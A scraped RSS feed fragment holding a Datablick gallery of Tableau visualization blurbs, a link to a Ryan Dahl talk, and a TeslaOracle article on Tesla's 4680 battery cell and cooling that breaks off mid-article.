                <div><p>See that in the <strong>lower left corner</strong>? &nbsp;That would be a live updating Tableau Dashboard as a desktop widget on my Mac. &nbsp;I can keep an eye on things while getting important work done. :-).&nbsp;</p><p>Why did I make this? &nbsp;After school and work my kids and I talk about our day. &nbsp;Sometimes feeling particularly proud of myself, I will show off some dashboard that I have been working on, only to get a "meh" from my kids. Annoyed with the tween eye-roll,&nbsp;I asked Max what he thought was a cool dashboard? &nbsp;He fired up Star Wars Battlefront, and then Halo 5 on his Xbox to show me how the "youngs" think data should be consumed. &nbsp;While in the process of battling the "Dark Side", Max kept a constant eye scan on the little floating widgets which let him know key things such as the weapon he was using, the position of his team &amp; the opposing team, his health level, etc. </p><p>This got me to thinking about the standard user experience of getting to a dashboard.</p></div>
              

              
            

            <!-- Metadata (Below Content) -->
            

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div data-click-through-url="/blog/2016/10/17/vizception">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="https://www.datablick.com/blog/2016/10/17/vizception" data-title="Vizception: Viz in a viz &amp; native d3.js integration on Tableau Server" data-description="<p style=&quot;margin-left:0px; margin-right:0px&quot;>We wanted to show a real example of how to bring more to Tableau Server without additional hardware or hosting needed. That‚Äôs right,&amp;nbsp;<em>no additional server purchase requisition requests needed</em>. There are really too many use cases to count when it comes to this, the details herein are only the tip of the iceberg.</p><p>We had a few short discussions and landed on the following example. This includes not only native d3.js integration but also an example of viz in a viz (in a viz) on Tableau Server. As a starting point, we used the twitter network graphs that Keith Helfrich and I recently <a target=&quot;_blank&quot; href=&quot;http://datablick.com/2016/08/10/the-tableau-conference-network/&quot;>shared</a>, which were showcased on the Tableau <a target=&quot;_blank&quot; href=&quot;http://www.tableau.com/about/blog/2016/9/among-best-tableau-web-58806&quot;>blog</a>&amp;nbsp;last month.</p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477249993819-QYEJO5L7CFVZYNOAUBA2/ke17ZwdGBToddI8pDm48kDwdeP4zsI6ri5CbrhFtmGhZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpzY0BiwG59NU2ptH9W06aJ775DFCb-jaNFB7_V80N1hO5J686DorL_embYD2eItal0/vizception.gif" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477249993819-QYEJO5L7CFVZYNOAUBA2/ke17ZwdGBToddI8pDm48kDwdeP4zsI6ri5CbrhFtmGhZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpzY0BiwG59NU2ptH9W06aJ775DFCb-jaNFB7_V80N1hO5J686DorL_embYD2eItal0/vizception.gif" data-image-dimensions="612x468" data-image-focal-point="0.5,0.5" alt="Vizception: Viz in a viz &amp; native d3.js integration on Tableau Server" data-load="false">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
                <div><p>We wanted to show a real example of how to bring more to Tableau Server without additional hardware or hosting needed. That‚Äôs right,&nbsp;<em>no additional server purchase requisition requests needed</em>. There are really too many use cases to count when it comes to this, the details herein are only the tip of the iceberg.</p><p>We had a few short discussions and landed on the following example. This includes not only native d3.js integration but also an example of viz in a viz (in a viz) on Tableau Server. As a starting point, we used the twitter network graphs that Keith Helfrich and I recently <a target="_blank" href="http://datablick.com/2016/08/10/the-tableau-conference-network/">shared</a>, which were showcased on the Tableau <a target="_blank" href="http://www.tableau.com/about/blog/2016/9/among-best-tableau-web-58806">blog</a>&nbsp;last month.</p></div>
              

              
            

            <!-- Metadata (Below Content) -->
            

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div data-click-through-url="http://www.datablick.com/blog/2015/08/27/diy-chord-diagrams-in-tableau-by-noah-salvaterra">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="http://www.datablick.com/blog/2015/08/27/diy-chord-diagrams-in-tableau-by-noah-salvaterra" data-title="Tableau Tesla" data-description="<p><span style=&quot;font-size:14px&quot;>Can I make this in Tableau? When it comes to chord diagrams I‚Äôve seen a lot of responses that make me cringe. Chord Diagrams aren‚Äôt built into Tableau, and I wouldn‚Äôt expect them to be added any time soon, but lines and polygons are sufficient to make just about anything you‚Äôd like. Seriously‚Ä¶ I‚Äôd like a Tesla, and here is the workbook. If it isn‚Äôt loaded yet,&amp;nbsp;consider that I‚Äôm building a car in a data visualization tool, and quit reading so fast!</span></p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477169049234-Q9FQ36RGNQ2NKV7Q4LBY/ke17ZwdGBToddI8pDm48kFeGH2rkhZSORkkEIZHSUT4UqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcmZZQxxWZnEITzGbDB9jmoGohpaDIMheRTr1-AuclbWCDmpQO3aplC4cziiTJy7dJ/TeslaRotateSmall.gif" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477169049234-Q9FQ36RGNQ2NKV7Q4LBY/ke17ZwdGBToddI8pDm48kFeGH2rkhZSORkkEIZHSUT4UqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcmZZQxxWZnEITzGbDB9jmoGohpaDIMheRTr1-AuclbWCDmpQO3aplC4cziiTJy7dJ/TeslaRotateSmall.gif" data-image-dimensions="1000x518" data-image-focal-point="0.5,0.5" alt="Tableau Tesla" data-load="false">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
                <p><span>Can I make this in Tableau? When it comes to chord diagrams I‚Äôve seen a lot of responses that make me cringe. Chord Diagrams aren‚Äôt built into Tableau, and I wouldn‚Äôt expect them to be added any time soon, but lines and polygons are sufficient to make just about anything you‚Äôd like. Seriously‚Ä¶ I‚Äôd like a Tesla, and here is the workbook. If it isn‚Äôt loaded yet,&nbsp;consider that I‚Äôm building a car in a data visualization tool, and quit reading so fast!</span></p>
              

              
            

            <!-- Metadata (Below Content) -->
            

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div data-click-through-url="http://www.datablick.com/blog/2014/04/26/30-minutes-bay-area-bike-share">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="http://www.datablick.com/blog/2014/04/26/30-minutes-bay-area-bike-share" data-title="Bay Area Bike Share" data-description="<p>In 2014 over 85% of riders using the Bay Area Bike Share withing the city of San Francisco were yearly subscribers. &amp;nbsp;For $88 a year, subscribers area allowed unlimited rides at no additional charge as long as each ride duration is less than 30 minutes. &amp;nbsp;Current bike station locations are concentrated downtown, but new stations are being proposed, making the service a viable commuting option, either on its own or in conjunction with MUNI or BART service.</p><p>What train stations could a rider reach in 30 minutes? &amp;nbsp;This network analysis shows the shortest route path between current and proposed stations that could be reached in 30 minutes.</p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477090700569-LUUNAYD0POIJN2DPAERM/ke17ZwdGBToddI8pDm48kMIebV6MdNPQMcRDrC5oPxMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcYNq5fJ2C9_-O2imggd78ThpTxC2EHJ0AncjrgkGSabrWLssnZmNZBC4goN-8MToa/BayBike30-crop.gif" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477090700569-LUUNAYD0POIJN2DPAERM/ke17ZwdGBToddI8pDm48kMIebV6MdNPQMcRDrC5oPxMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcYNq5fJ2C9_-O2imggd78ThpTxC2EHJ0AncjrgkGSabrWLssnZmNZBC4goN-8MToa/BayBike30-crop.gif" data-image-dimensions="1000x600" data-image-focal-point="0.25,0.7333333333333333" alt="Bay Area Bike Share" data-load="false">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
                <div><p>In 2014 over 85% of riders using the Bay Area Bike Share withing the city of San Francisco were yearly subscribers. &nbsp;For $88 a year, subscribers area allowed unlimited rides at no additional charge as long as each ride duration is less than 30 minutes. &nbsp;Current bike station locations are concentrated downtown, but new stations are being proposed, making the service a viable commuting option, either on its own or in conjunction with MUNI or BART service.</p><p>What train stations could a rider reach in 30 minutes? &nbsp;This network analysis shows the shortest route path between current and proposed stations that could be reached in 30 minutes.</p></div>
              

              
            

            <!-- Metadata (Below Content) -->
            

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div data-click-through-url="http://datablick.com/blog/2015/10/12/radial-trees-in-tableau-by-chris-demartini/">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="http://datablick.com/blog/2015/10/12/radial-trees-in-tableau-by-chris-demartini/" data-title="The Tableau JS API Hierarchy Radial Tree" data-description="<p style=&quot;margin-left:0px; margin-right:0px&quot;>This is an incremental post to <a target=&quot;_blank&quot; href=&quot;http://datablick.com/2015/06/28/navigating-your-family-history-in-tableau-by-chris-demartini/&quot;>navigating your family tree</a>&amp;nbsp;from a few months back. This builds off of that visualization technique to manipulate the tree into a radial view. Also, as with the original, the tree is 100% dynamic and you can reset each node in the tree as the root node, toggle between tree views as well as change the API you are analyzing.</p><p>What is the benefit of a radial tree? As your data volume and hierarchy levels increase, you will ultimately run out of space on your screen with a traditional hierarchy. That is where the radial tree can add value. With the root node as the center of the viz, and each level of the hierarchy increasing in diameter, you ultimately have more viz real estate to work with as you dig deeper into your hierarchy.</p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477108128849-5W20SN6WKH9LGOEQFAQ7/ke17ZwdGBToddI8pDm48kMIebV6MdNPQMcRDrC5oPxMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKctvtKxvFKvzGJ1i3etrw6jWr5XLgW84HmgctGrHIIy7VqiFIry_j_CAPMtj0TsXq-/RadialTree.png" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477108128849-5W20SN6WKH9LGOEQFAQ7/ke17ZwdGBToddI8pDm48kMIebV6MdNPQMcRDrC5oPxMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKctvtKxvFKvzGJ1i3etrw6jWr5XLgW84HmgctGrHIIy7VqiFIry_j_CAPMtj0TsXq-/RadialTree.png" data-image-dimensions="1000x600" data-image-focal-point="0.5,0.5" alt="The Tableau JS API Hierarchy Radial Tree" data-load="false" src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1477108128849-5W20SN6WKH9LGOEQFAQ7/ke17ZwdGBToddI8pDm48kMIebV6MdNPQMcRDrC5oPxMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKctvtKxvFKvzGJ1i3etrw6jWr5XLgW84HmgctGrHIIy7VqiFIry_j_CAPMtj0TsXq-/RadialTree.png">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
                <div><p>This is an incremental post to <a target="_blank" href="http://datablick.com/2015/06/28/navigating-your-family-history-in-tableau-by-chris-demartini/">navigating your family tree</a>&nbsp;from a few months back. This builds off of that visualization technique to manipulate the tree into a radial view. Also, as with ‚Ä¶</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.datablick.com/art-gallery">https://www.datablick.com/art-gallery</a></em></p>]]>
            </description>
            <link>https://www.datablick.com/art-gallery</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594718</guid>
            <pubDate>Fri, 25 Sep 2020 22:21:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ryan Dahl, Deno and Node.js creator, speaking live at 4pm PT]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24594685">thread link</a>) | @feross
<br/>
September 25, 2020 | https://speakeasyjs.com/watch | <a href="https://web.archive.org/web/*/https://speakeasyjs.com/watch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://speakeasyjs.com/watch</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594685</guid>
            <pubDate>Fri, 25 Sep 2020 22:17:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla‚Äôs 4680 cell is a stroke of genius, Sandy Munro on Battery Day]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24594572">thread link</a>) | @CarCooler
<br/>
September 25, 2020 | https://www.teslaoracle.com/2020/09/25/tesla-4680-cell-analyzed-sandy-munro/ | <a href="https://web.archive.org/web/*/https://www.teslaoracle.com/2020/09/25/tesla-4680-cell-analyzed-sandy-munro/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
			<figure>
            <figcaption data-amp-original-style="border:1px dotted blue; margin:2px 0; text-align:center;">Advertisement</figcaption>
            <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="4076643206" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
              
            </amp-ad>
            </figure>
				<!-- .Adsense Ad -->

		
<p>Tesla CEO Elon Musk showed the road to 56% cheaper batteries in the near future. This would be achieved with Tesla‚Äôs breakthrough innovations in cell chemistry and materials, simplifying and speeding up the cell manufacturing processes, a <a href="https://www.teslaoracle.com/2020/09/23/model-y-giga-casting-structural-battery-innovations-battery-day-part-1/#structural-battery">structural battery</a>, and the new 4680 form factor.</p>



<div data-amp-lightbox="true"><figure><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Tesla-Cell.jpg" alt="Tesla's future 4680 battery cell. 6X more power, 5X more energy, and 16% more range." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Tesla-Cell.jpg 600w, https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Tesla-Cell-293x300.jpg 293w" sizes="(max-width: 600px) 100vw, 600px" width="600" height="614" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Tesla-Cell.jpg" alt="Tesla's future 4680 battery cell. 6X more power, 5X more energy, and 16% more range." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Tesla-Cell.jpg 600w, https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Tesla-Cell-293x300.jpg 293w" sizes="(max-width: 600px) 100vw, 600px" width="600" height="614" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzYxNCcgd2lkdGg9JzYwMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Fig 1: Tesla‚Äôs future 4680 battery cell. 6X more power, 5X more energy, and 16% more range.</figcaption></figure></div>



<h2>4680 cell-based battery architecture</h2>



<p>Vehicle teardown expert Sandy Munro has further analyzed how much this new cell form factor can help Tesla achieve its battery goals. According to his calculations, in the same space of the current 74 kWh <a href="https://www.teslaoracle.com/topic/model-y/">Tesla Model Y</a> battery pack, a 130 kWh battery can be accommodated ‚Äî that‚Äôs about double the energy storage.</p>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-1024x576.jpg" alt="4680 vs. 2170 cell Tesla battery pack. More energy storage in the same battery pack space." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-1536x864.jpg 1536w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-1200x675.jpg 1200w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-1024x576.jpg" alt="4680 vs. 2170 cell Tesla battery pack. More energy storage in the same battery pack space." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-1536x864.jpg 1536w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680-1200x675.jpg 1200w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Cells-Per-Brick-Module-4680.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Fig 2: 4680 vs. 2170 cell Tesla battery pack. More energy storage in the same battery pack space. Credits: <a href="https://munrolive.com/" target="_blank" rel="noreferrer noopener">MunroLive.com</a>.</figcaption></figure>



<p>2170 cell is 5000 mAh and Munro‚Äôs analysis says the 4680 new Tesla cell will be around ~9000 mAH. Currently, 4,416 (2170) cells are placed inside a <a href="https://www.teslaoracle.com/topic/model-3/">Tesla Model 3</a> and Model Y Long-Range battery packs, there will only be 960 cells required to fill the same space (see Fig 2 above).</p>



<p>The 4680 cell-based battery pack will be much simpler and cheaper to build. The 2170 based battery pack architecture is made of cells divided into 4 modules and further into bricks of 46 cells each and every module requires is own controller circuit. </p>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space-1024x576.jpg" alt="A total of ~960 new 4680 battery cells fit in the same packaging space (Model 3/Model Y Long-Range or Performance)." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space-1024x576.jpg" alt="A total of ~960 new 4680 battery cells fit in the same packaging space (Model 3/Model Y Long-Range or Performance)." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/960-4680-Cells-Can-Fit-Same-Space.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Fig 3: A total of ~960 new 4680 battery cells fit in the same packaging space (Model 3/Model Y Long-Range or Performance). Credits: Tesla (TSLA) / <a href="https://munrolive.com/" target="_blank" rel="noreferrer noopener">MunroLive.com</a>.</figcaption></figure>



<p>This complexity will be eliminated by using the new 4680 cell design and coupled with the tabless cell construction, the manufacturing process becomes even simpler requiring fewer parts.</p>



<p>Sandy Munro even showed one of the Model Y module spaces filled with his 5070 dummy cells which he predicted before the Battery Day, pretty close idea and the size estimate (see Fig 4).</p>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells-1024x576.jpg" alt="Sandy Munro demonstrates how the 4680 form factor cells would occupy a Tesla battery pack module." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells-1024x576.jpg" alt="Sandy Munro demonstrates how the 4680 form factor cells would occupy a Tesla battery pack module." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Sandy-Munro-4680-cells.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Fig 4: Sandy Munro demonstrates how the 4680 form factor cells would occupy a Tesla battery pack module. Credits: Tesla (TSLA) / <a href="https://munrolive.com/" target="_blank" rel="noreferrer noopener">MunroLive.com</a>.</figcaption></figure>



<p><strong>Related:</strong> <a href="https://www.teslaoracle.com/2020/09/23/model-y-giga-casting-structural-battery-innovations-battery-day-part-1/">Battery Day Part 1 (Giga Castings &amp; Structural Battery)</a> | <a href="https://www.teslaoracle.com/2020/09/24/tesla-cybertruck-atv-roadster-semi-and-the-big-party-battery-day-part-2/">Battery Day Part 2: The event in pictures</a></p>



<div><figure><a href="https://evannex.com/pages/tesla-model-y-accessories/?ref=Iqtidar_TeslaOracle_ModelY_Banner" target="_blank" rel="sponsored noopener noreferrer"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/06/Tesla-Model-Y-Accessories_small.jpg" alt="" width="508" height="360" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/06/Tesla-Model-Y-Accessories_small.jpg" alt="" width="508" height="360" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2MCcgd2lkdGg9JzUwOCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption>‚Äì Sponsored ‚Äì</figcaption></figure></div>



<h2>Improved battery cooling</h2>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes-1024x576.jpg" alt="Battery coolant channels in a 2170 cell battery pack in a Tesla." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes-1024x576.jpg" alt="Battery coolant channels in a 2170 cell battery pack in a Tesla." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Micro-Channel-Coolant-Tubes.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Fig 5: Battery coolant channels in a 2170 cell battery pack in a Tesla. Credits: <a href="https://munrolive.com/" target="_blank" rel="noreferrer noopener">MunroLive.com</a>.</figcaption></figure>



<p>During the <a href="https://www.teslaoracle.com/2020/09/23/model-y-giga-casting-structural-battery-innovations-battery-day-part-1/#presentation">Battery Day presentation</a>, Elon Musk presented a slide that shows the dissection of 2170 vs. 4680 battery pack. If we look closely (see Fig 6 below), the cooling tubes we see in Fig 5 above are at the bottom of the battery pack.</p>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom-1024x576.jpg" alt="4680 cell-based battery pack to have the coolant tubes under the cells not on the sides like the current 2170 cell-based batteries." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom-1024x576.jpg" alt="4680 cell-based battery pack to have the coolant tubes under the cells not on the sides like the current 2170 cell-based batteries." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/4680-Battery-Cooling-Bottom.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Fig 6: 4680 cell-based battery pack to have the coolant tubes under the cells, not on the sides like the current 2170 cell-based batteries.</figcaption></figure>



<p>According to Sandy Munro, the right way to cool down the batteries is from top and bottom. Currently, in the 2170 battery packs, the cells are cooled from the sides but in the future, Tesla is planning to do it the right way, installing a cooling plate underneath the batteries.</p>



<h2>Rigidity &amp; safety</h2>



